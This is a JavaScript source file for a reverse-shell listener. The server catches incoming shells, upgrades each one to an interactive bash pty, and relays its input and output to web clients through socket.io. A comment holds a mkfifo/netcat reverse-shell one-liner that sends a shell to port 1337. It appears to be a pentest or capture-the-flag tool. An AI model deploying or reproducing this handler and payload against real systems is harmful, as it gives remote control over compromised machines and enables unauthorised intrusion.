const net = require("net");
const uuid = require("uuid");

module.exports = class TCPServer {
  constructor(port, io) {
    this.shells = [];
    this.io = io;

    this.server = net
      .createServer((socket) => {
        // console.log(socket.remoteAddress);
        // socket.setNoDelay(true);
        socket.id = uuid.v4();
        socket.history = [];
        let namespace = io.of(socket.id);

        this.addTcpShell(socket);

        // Upgrade shell
        socket.write(
          Buffer.from(`python3 -c 'import pty; pty.spawn("/bin/bash")'\n`)
        );

        namespace.on("connection", (user) => {
          for (const h of socket.history) {
            user.emit("data", h);
          }
          user.on("data", (data) => {
            socket.write(data);
          });
        });
        socket.on("data", (data) => {
          socket.history.push(data);
          // $ clear -> clear history
          if(data.toString("hex") == '1b5b481b5b324a1b5b334a'){
            socket.history = []
          }
          namespace.emit("data", data);
        });

        socket.on("close", (e) => {
          this.removeTcpShell(socket.id);
        });
      })
      .listen(port);

    console.log(`TCP Socket: ${port}`);
  }

  // rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f

  // New reverse shell
  addTcpShell(socket) {
    // console.log("New shell", socket.id);
    this.shells.push(socket);
    this.io.emit("shells", this.getSendableShells());
  }

  // Connection broke
  removeTcpShell(id) {
    this.shells = this.shells.filter((s) => s.id != id);
    this.io.emit("shells", this.getSendableShells());
  }

  // User force delete
  deleteTcpShell(id) {
    let shell = this.shells.find((s) => s.id == id).destroy();
  }

  getSendableShells() {
    return this.shells.map((s) => {
      return { id: s.id };
    });
  }

  destroy() {
    this.shells.map((s) => this.deleteTcpShell(s.id));
    this.server.close();
  }
};
